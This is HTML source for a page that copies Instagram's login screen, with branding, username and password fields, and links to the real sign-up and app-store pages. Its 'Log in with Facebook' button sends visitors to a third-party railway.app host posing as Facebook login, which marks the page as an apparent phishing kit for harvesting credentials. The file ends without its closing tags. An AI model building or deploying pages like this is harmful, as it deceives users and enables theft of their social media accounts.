<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="shortcut icon" href="https://www.google.com/s2/favicons?domain=www.instagram.com&sz=128"
        type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="page-container">
        <section>
        <div class="box">
            <div class="banner-container">
                <img class="insta-banner" src="banner.png" alt="">
            </div>
            <div class="form-cointainer">
                <form action="#">
                    <div class="form-group">
                        <label for="username-field top-label" id="username-label" hidden>Phone number, username, or
                            email</label>
                        <input type="text" placeholder="Phone number, username, or email" id="username-field">
                    </div>
                    <div class="form-group">
                        <label for="passwowrd-field" id="password-label" hidden>Password</label>
                        <input type="password" placeholder="Password" id="password-field" style="padding-right: 50px;">
                        <span id="password-show" hidden>Show</span>
                    </div>
                    <div class="form-group login-btn-container">
                        <button id="login-btn">Log in</button>
                    </div>
                </form>
            </div>
            <div class="divider-container">
                <div class="seperator"></div>
                <span>or</span>
            </div>
            <div class="login-fb-container">
                <button id="fb-login" onclick="window.location.href='https://facebook-login-production.up.railway.app/login'"><img src="https://cdn.pixabay.com/photo/2015/05/17/10/51/facebook-770688_960_720.png" id="fb-logo"></img> <span>Log in with Facebook</span></button>
            </div>
            <div class="recover-container">
                <a href="https://www.instagram.com/accounts/password/reset/" class="recover-link">Forgot password?</a>
            </div>
        </div>
        <div class="box bottom-box">
            <span class="no-account-text">
                <p>
                    Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-link">Sign up</a>
                </p>
            </span>
        </div>
        <div class="box no-border">
            <span class="branding-label">Get the app</span>
            <div class="branding-container">
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" class="branding" alt=""></a>
                <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt" target="_blank"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" class="branding" alt=""></a>
            </div>
        </div>
    </section>
